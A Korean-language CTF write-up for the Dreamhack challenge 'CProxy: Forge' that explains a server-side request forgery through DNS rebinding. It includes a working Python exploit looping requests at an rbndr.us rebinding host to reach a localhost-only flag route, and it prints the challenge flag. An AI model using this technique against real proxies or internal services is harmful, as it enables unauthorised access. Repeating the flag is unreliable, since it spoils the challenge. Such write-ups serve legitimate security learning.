---
title: "CProxy: Forge"
date: 2026-07-15
draft: true
tags: ["SSRF"]
ShowToc: true
---

## 풀이
``` js
app.get('/api/local/flag', requireLocal, async (req, res) => {
	return res.send(await fs.readFile('/flag_forge', { encoding: 'ascii' }));
});
const requireLocal = async (req, res, next) => { 
	if (req.socket.remoteAddress === '127.0.0.1') {
		next();
	} else {
		res.sendStatus(403);
	}
}
```
1. api/local/flag 경로에서 실행 
2. requireLocal -> 서버가 자기 환경에서 직접 접속하게 만들어야 함
3. 서버가 대신 요청을 보내주는 기능 있는지 확인 
```js
if (cachedRes === undefined) {
	req.cacheKey = cacheKey;
	next();
} else {
	net.sendResponse(res, cachedRes);
}
```
4. 캐시에 없으면 cachekey 저장해두고 다음으로 진행 -> 이 지점이 중요
5. 캐시에 있으면 클라이언트에게 response 전송
6. 캐시에 없는 경우, 서버가 URL 가지러 나감 
```js
const proxyRes = await net.get(url);
if (proxyRes === undefined) {
	return res.sendStatus(404);
}

net.sendResponse(res, proxyRes);
```
7. url 가져온 뒤 클라이언트에게 응답 전달
8. 필터 우회 필요 -> 이들 중 하나라도 충족하면 실패
```js
if ((scheme !== 'http' && scheme !== 'https') ||
	typeof host !== 'string' ||
	typeof port !== 'string' ||
	typeof path !== 'string' ||
	(!bypassDns && !await isSafeHost(host))) {
	return;
} // scheme은 http, host/port/path type string, host는 정규표현식 이내 + 공인
```
9. 공인이어야 통과 가능 -> localhost 사용 불가능 
```js
const address = await dns.resolve4(host);
const res = await axios.get(url, {
	maxRedirects: 0,
	signal: aborter.signal,
	validateStatus: _ => true
});
```
10. 두번의 DNS 조회의 시차를 활요 
11. 첫 요청에는 공인 ip 제공하고, 두번째 요청에는 localhost -> 실제로 index.js에서 두번째 buildUrl()은 bypass false여서 검증 로직 작동
```js
import requests

BASE = 'http://host3.dreamhack.games:14155/'   # 인스턴스 주소로 교체
s = requests.Session()

# 1) 아무 계정 register + login (proxy는 requireAuth라 세션 필요)
s.post(f'{BASE}/auth', data={'id': 'a', 'pw': 'a', 'register': '1'})
s.post(f'{BASE}/auth', data={'id': 'a', 'pw': 'a'})

# 2) 리바인딩 호스트: 127.0.0.1(7f000001) <-> 공인 1.1.1.1(01010101) 랜덤 flip
host = '7f000001.01010101.rbndr.us'
params = {'scheme': 'http', 'host': host, 'port': '8080', 'path': '/api/local/flag'}

# 3) 타이밍(isSafeHost=공인, axios=127.0.0.1) 맞을 때까지 반복
for i in range(300):
    r = s.get(f'{BASE}/proxy', params=params)
    if 'DH{' in r.text:
        print(f'[{i}] {r.text}')
        break
```
12. rbndr.us 사용 -> 매번 공인ip와 사설ip 랜덤으로 리바인딩
13. `DH{5774d88cccaab328a3a83f8c070c0a67c37b049bc228358bf2e2da77b6d7d06a}`

## 배운 점
1. DNS로 검증했지만, axios가 재조회해서 붙는 IP가 달라짐 (검증 대상 != 실제), crawling과 유사 -> 둘 다 검증 대상과 실제가 같지 않았음
2. 목표(flag 라우트)에서 역방향으로 싱크 -> 코드 타고 좁히기
3. DNS 리바인딩
4. SSRF의 증거: 서버 자신만 접근 가능
```js
   remoteAddress === '127.0.0.1' 
```
   